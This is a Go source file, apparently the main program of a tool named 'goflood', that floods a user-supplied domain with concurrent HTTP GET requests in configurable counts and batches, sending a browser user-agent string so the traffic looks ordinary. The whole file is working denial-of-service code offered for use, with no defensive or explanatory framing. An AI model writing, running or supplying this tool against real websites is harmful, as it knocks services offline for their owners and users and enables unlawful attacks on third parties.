package main

import (
	"fmt"
	"github.com/ao/goflood/helper"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strconv"
	"sync"
)

func call(wg *sync.WaitGroup, domain string, userAgent string) {
	defer wg.Done()

	client := &http.Client{}

	req, err := http.NewRequest("GET", "http://"+domain, nil)
	if err != nil {
		log.Fatalln(err)
	}

	req.Header.Set("User-Agent", userAgent)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}

	defer resp.Body.Close()
	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Fatalln(err)
	}

	fmt.Print(".")
}

func main() {
	fmt.Println(helper.Banner())
	var wg sync.WaitGroup

	var domain string
	var count int
	var batch int

	userAgents := map[string]string {
		"0": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
		"1": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
		"2": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36",
		"3": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/95.0.4638.50 Mobile/15E148 Safari/604.1",
		"4": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.50 Mobile Safari/537.36",
	}

	args := os.Args
	if len(args)<4 {

		fmt.Println("Enter a domain name (example.com): ")
		fmt.Scanln(&domain)

		fmt.Println("Enter a count (10): ")
		fmt.Scanln(&count)

		fmt.Println("Enter a batch: (1): ")
		fmt.Scanln(&batch)
	} else {
		domain = args[1]
		count, _ = strconv.Atoi(args[2])
		batch, _ = strconv.Atoi(args[3])
	}

	fmt.Println("Flooding "+domain+" "+strconv.Itoa(count)+" times, in "+strconv.Itoa(batch)+" batches")

	for i := 1; i <= batch; i++ {
		fmt.Println("Batch #"+strconv.Itoa(i))
		wg.Add(count)
		for i := 0; i < count; i++ {
			go call(&wg, domain, userAgents["0"])
		}
		wg.Wait()
		fmt.Println("Done")
	}

	fmt.Println("Complete")
}
